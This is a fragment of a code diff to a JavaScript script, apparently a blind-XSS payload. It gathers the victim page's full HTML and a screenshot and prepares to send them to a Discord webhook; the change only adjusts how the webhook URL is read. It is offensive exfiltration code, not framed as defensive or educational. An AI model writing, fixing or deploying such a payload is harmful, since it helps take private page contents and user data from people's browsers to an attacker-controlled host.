@@ -62,7 +62,7 @@ script.onload = function() {
         msg += '\n\nFULL DOCUMENT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.documentElement.innerHTML;
         msg += '\n\nSCREENSHOT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + base64image;
 
-        var discordWebhook = process.env.DISCORD_WEBHOOK;
+        var discordWebhook = DISCORD_WEBHOOK;
         
         // Tạo file Blob từ nội dung
         var blob = new Blob([msg], { type: "text/plain" });
